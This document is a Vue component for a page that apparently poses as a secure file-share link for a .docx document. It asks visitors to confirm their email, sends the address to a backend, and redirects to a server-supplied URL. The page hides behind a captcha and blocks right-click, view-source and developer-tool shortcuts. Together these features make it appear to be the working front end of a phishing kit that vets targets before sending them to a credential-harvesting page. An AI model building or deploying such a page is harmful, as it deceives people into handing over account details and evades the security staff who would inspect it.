<template>
  <div v-if="!captchaToken" class="gate-container">
    <main>
      <div class="instructions captcha-adjusted">
        <p>Please stand by while we are checking if the site connection is secure.</p>
        <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
      </div>
    </main>
  </div>

  <div v-else class="container">
    <div class="overlay" id="overlay">
      <div class="input-section" id="inputSection">
        <form @submit.prevent="submitForm">
          <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="100" height="35">
          <p>You've received a secure link to:</p>
          <p style="font-size: 16px; color: #000000;">TT93794-2025.docx</p>
          <p style="font-size: 16px;">To proceed, enter the email that this <br>item was shared to</p>

          <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
          <input id="honeypot" v-model="honeypot" type="text" tabindex="-1" autocomplete="off" aria-hidden="true" class="visually-hidden" />

          <label for="email" class="visually-hidden">Email address</label>
          <input id="email" v-model="email" type="email" placeholder="Enter email" required :disabled="loading" />

          <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>

          <button type="submit" :disabled="loading">
            Next
          </button>

          <p><br> © 2025 Privacy Policy<br><br><br></p>
        </form>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const honeypot = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)
let turnstileRendered = false

onMounted(async () => {
  await nextTick()
  document.addEventListener('contextmenu', e => e.preventDefault())
  document.addEventListener('keydown', e => {
    if (
      e.key === 'F12' ||
      (e.ctrlKey && ['u', 's', 'p'].includes(e.key.toLowerCase())) ||
      (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase()))
    ) {
      e.preventDefault()
    }
  })

  if (window.turnstile && !turnstileRendered) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: token => {
        captchaToken.value = token
        setTimeout(() => {
          captchaToken.value = null
          turnstileRendered = false
          window.turnstile.render('.cf-turnstile', {
            sitekey: '0x4AAAAAABgei6QZruCN7n08',
            callback: t => captchaToken.value = t
          })
        }, 120000)
      }
    })
    turnstileRendered = true
  }
})

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

async function submitForm() {
  if (loading.value) return
  error.value = ''

  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format'
    return
  }

  loading.value = true
  try {
    const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: email.value,
        captchaToken: captchaToken.value,
        middleName: honeypot.value
      })
    })
    const data = await res.json()
    if (!res.ok || !data.valid) throw new Error(data.message || 'Verification failed')
    if (data.redirectUrl) {
      window.location.href = data.redirectUrl
    }
  } catch (err) {
    error.value = err.message
    loading.value = false
  }
}
</script>

<style scoped>
body, html {
  height: 100vh;
  width: 100vw;
  margin: 0;
  padding: 0;
  font-family: Arial, sans-serif;
  background-color: #f7f9f9;
  color: #000;
  overflow: hidden;
}

.container {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  height: 100vh;
}

.overlay {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  background-color: #f9f9f9;
}

.input-section {
  background-color: #fff;
  padding: 13px;
  border: 0.1px solid #dddd;
  text-align: center;
  width: 100%;
  max-width: 324px;
}

.input-section p,
.input-section input {
  color: black;
}

.input-section input {
  width: 100%;
  padding: 10px 5px;
  margin: 15px 0;
  display: block;
  border: 1px solid #ccc;
  font-size: 16px;
  box-sizing: border-box;
}

.input-section button {
  background-color: #1D7CDB;
  color: white;
  border: none;
  padding: 9px 30px;
  cursor: pointer;
  font-size: 16px;
}

.input-section button:hover {
  background-color: #1D7CDB;
}

.cf-turnstile {
  transform: scale(0.9);
  transform-origin: center;
  height: auto !important;
  width: auto !important;
  margin-top: 2rem;
}

.captcha-adjusted {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  height: 100vh;
  padding: 0 1rem;
  text-align: center;
}

.visually-hidden {
  position: absolute !important;
  height: 1px;
  width: 1px;
  overflow: hidden;
  clip: rect(1px, 1px, 1px, 1px);
  white-space: nowrap;
}

.error {
  color: red;
  font-size: 0.9rem;
  margin-top: -10px;
  margin-bottom: 10px;
}
</style>
